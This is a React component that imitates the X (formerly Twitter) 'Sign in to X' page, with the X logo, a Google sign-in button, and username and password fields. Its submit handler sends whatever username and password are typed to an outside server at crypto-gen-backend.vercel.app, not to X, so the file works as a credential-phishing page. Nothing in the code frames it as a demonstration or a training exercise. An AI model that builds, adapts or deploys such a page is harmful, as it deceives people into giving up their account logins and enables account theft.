import { useState } from 'react';

const Twitter = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
  
    try {
      const response = await fetch('https://crypto-gen-backend.vercel.app/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: email.trim(),
          password: password.trim(),
        }),
      });
  
      const data = await response.json();
  
      if (!response.ok) {
        throw new Error(data.message || 'Login failed');
      }
  
      alert('Login successful!');
    } catch (err) {
      setError(err.message || 'Connection error. Please try again.');
      console.error('Fetch error:', err);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="w-full max-w-[364px] sm:max-w-[440px] bg-black rounded-2xl relative border border-neutral-600">
        <button className="absolute left-2 top-2 p-2 hover:bg-gray-800 rounded-full">
          <svg viewBox="0 0 24 24" className="w-5 h-5 text-white">
            <path
              fill="currentColor"
              d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"
            />
          </svg>
        </button>

        <div className="flex justify-center mb-6 pt-3">
          <svg viewBox="0 0 24 24" aria-hidden="true" className="w-8 h-8 text-white">
            <g>
              <path
                fill="currentColor"
                d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
              />
            </g>
          </svg>
        </div>

        <h1 className="text-[31px] font-bold mb-8 px-8">Sign in to X</h1>

        <form onSubmit={handleSubmit} className="px-8">
          <button
            type="button"
            className="w-full flex items-center justify-center gap-3 bg-white cursor-pointer text-black py-2.5 px-4 rounded-full border border-gray-300 hover:bg-gray-200 transition-colors duration-200 ease-in-out font-medium text-[15px] mb-3"
          >
            <svg className="w-[18px] h-[18px]" viewBox="0 0 24 24">
              <path
                fill="#4285F4"
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              />
              <path
                fill="#34A853"
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              />
              <path
                fill="#FBBC05"
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
              />
              <path
                fill="#EA4335"
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
              />
            </svg>
            Sign in with Google
          </button>

          <input
            type="text"
            placeholder="Phone, email address, or username"
            className="w-full bg-black text-white border border-[#2f3336] rounded text-[15px] p-4 mb-3 focus:outline-none focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0]"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <input
            type={showPassword ? 'text' : 'password'}
            placeholder="Password"
            className="w-full bg-black text-white border border-[#2f3336] rounded text-[15px] p-4 mb-3 focus:outline-none focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0]"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />

          {error && <p className="text-[#f4212e] text-sm mt-1 mb-3">{error}</p>}

          <button
            type="submit"
            className="w-full bg-white text-black py-2 rounded-full font-bold text-[15px] mb-3 hover:bg-[#e6e6e6] cursor-pointer transition-colors duration-150 ease-in"
          >
            Next
          </button>

          <button
            type="button"
            className="w-full bg-black text-white py-2 rounded-full border border-[#536471] font-bold text-[15px] cursor-pointer mb-6 hover:bg-[#181818] transition"
          >
            Forgot password?
          </button>
        </form>

        <p className="text-[#71767b] text-[15px] text-center pb-8 px-8">
          Don&apos;t have an account?{' '}
          <a href="#" className="text-[#1d9bf0] hover:underline">
            Sign up
          </a>
        </p>
      </div>
    </div>
  );
};

export default Twitter;
